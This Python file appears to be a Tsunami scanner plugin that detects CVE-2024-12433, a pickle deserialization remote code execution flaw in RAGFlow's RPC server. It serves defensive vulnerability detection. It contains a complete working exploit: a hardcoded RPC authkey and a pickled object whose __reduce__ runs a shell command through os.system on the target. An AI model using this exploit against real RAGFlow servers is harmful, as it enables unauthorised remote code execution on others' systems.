"""A Tsunami plugin for detecting CVE-2024-12433."""

import io
from multiprocessing.connection import Client
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pickle
import time

from absl import logging

from google.protobuf import timestamp_pb2
import tsunami_plugin
from common.data.network_service_utils import TransportProtocol
from common.net.http.http_client import HttpClient
from plugin.payload.payload_generator import PayloadGenerator
import detection_pb2
import payload_generator_pb2 as pg
import plugin_representation_pb2
import vulnerability_pb2

_VULN_DESCRIPTION = (
    "The RAGFlow framework is vulnerable to an insecure deserialization issue"
    " that can be exploited by sending a simple pickle serialized payload to"
    " the RPC server. This can lead to remote code execution."
)
_SLEEP_TIME_SEC = 20


class RestrictedUnpickler(pickle.Unpickler):

  def find_class(self, module, name):
    # Only allow safe classes from specific modules
    allowed = {
        "builtins": {"KeyError"},
        "collections": {"OrderedDict"},
        # Add other safe modules and classes as needed
    }

    if module in allowed and name in allowed[module]:
      if module == "builtins":
        return getattr(__import__(module), name)
      return getattr(__import__(module), name)

    # Forbid everything else
    raise pickle.UnpicklingError(f"Global '{module}.{name}' is forbidden")


class RagFlowRceDetector(tsunami_plugin.VulnDetector):
  """A Tsunami Plugin that detects RCE on the RAGFlow target."""

  def __init__(
      self, http_client: HttpClient, payload_generator: PayloadGenerator
  ):
    self.http_client = http_client
    self.payload_generator = payload_generator

  def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
    """Defines the PluginDefinition for RagFlowRceDetector.

    Returns:
      The PluginDefinition used for the Tsunami engine to identify this plugin.
    """
    return tsunami_plugin.PluginDefinition(
        info=plugin_representation_pb2.PluginInfo(
            type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
            name="RagFlowRceDetector",
            version="1.0",
            description=_VULN_DESCRIPTION,
            author="am0o0",
        )
    )

  def GetAdvisories(self) -> list[vulnerability_pb2.Vulnerability]:
    """Returns the advisories for this plugin."""
    return [
        vulnerability_pb2.Vulnerability(
            main_id=vulnerability_pb2.VulnerabilityId(
                publisher="TSUNAMI_COMMUNITY", value="RagFlowRceDetector"
            ),
            related_id=[
                vulnerability_pb2.VulnerabilityId(
                    publisher="CVE", value="CVE-2024-12433"
                )
            ],
            severity=vulnerability_pb2.Severity.CRITICAL,
            title="RAGFlow RPC Server Insecure Deserialization RCE",
            recommendation=(
                'Users should not expose "rag/llm/rpc_server.py" to the'
                " internet."
            ),
            description=_VULN_DESCRIPTION,
        ),
    ]

  def Detect(
      self,
      target: tsunami_plugin.TargetInfo,
      matched_services: list[tsunami_plugin.NetworkService],
  ) -> tsunami_plugin.DetectionReportList:
    """Run detection logic for the RAGFlow target.

    Args:
      target: TargetInfo about RAGFlow Insecure Deserialization.
      matched_services: A list of network services whose vulnerabilities could
        be detected by this plugin. "ppp" for example would be on this list.

    Returns:
      A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
      scanning target.
    """
    logging.info("RAGFlowRceDetector starts detecting.")
    try:
      vulnerable_services = [
          service
          for service in matched_services
          if self._IsSupportedService(service)
          and self._IsRagFlowRpcService(service)
      ]

      return detection_pb2.DetectionReportList(
          detection_reports=[
              self._BuildDetectionReport(target, service)
              for service in vulnerable_services
              if self._IsServiceVulnerable(service)
          ]
      )
    except ConnectionRefusedError:
      return detection_pb2.DetectionReportList(detection_reports=[])

  def _IsSupportedService(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service is an unknown service."""
    return network_service.transport_protocol == TransportProtocol.TCP

  def _IsRagFlowRpcService(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    # RAGFlow RPC Server reflect the name of data we send
    c = Client(
        (
            network_service.network_endpoint.ip_address.address,
            network_service.network_endpoint.port.port_number,
        ),
        authkey=b"infiniflow-token4kevinhu",
    )
    data = {
        "func_name": "chat",
        "args": ("messages", "gen_conf"),
        "kwargs": None,
    }
    c.send(pickle.dumps(data))
    # response = pickle.loads(c.recv())
    response = RestrictedUnpickler(io.BytesIO(c.recv())).load()
    c.close()
    return type(response) is KeyError and str(response) == "'func_name'"

  def _IsServiceVulnerable(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service may result in RCE."""

    config = pg.PayloadGeneratorConfig(
        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
        interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
        execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
    )
    payload = self.payload_generator.generate(config)
    if not payload.get_payload_attributes().uses_callback_server:
      return False

    class Payload:

      def __reduce__(self):
        # attempt to install curl if it is not already installed
        return (
            __import__("os").system,
            (f'/bin/sh -c "{payload.get_payload()}"',),
        )

    try:
      c = Client(
          (
              network_service.network_endpoint.ip_address.address,
              network_service.network_endpoint.port.port_number,
          ),
          authkey=b"infiniflow-token4kevinhu",
      )
      c.send(pickle.dumps(Payload()))
      c.close()
    except Exception:  # pylint: disable=broad-exception-caught
      logging.exception(
          "Unable to query %s", network_service.network_endpoint.hostname
      )
    time.sleep(_SLEEP_TIME_SEC)
    return payload.check_if_executed()

  def _BuildDetectionReport(
      self,
      target: tsunami_plugin.TargetInfo,
      vulnerable_service: tsunami_plugin.NetworkService,
  ) -> detection_pb2.DetectionReport:
    """Generate the detection report for all vulnerability findings."""
    return detection_pb2.DetectionReport(
        target_info=target,
        network_service=vulnerable_service,
        detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
        detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
        vulnerability=self.GetAdvisories()[0],
    )
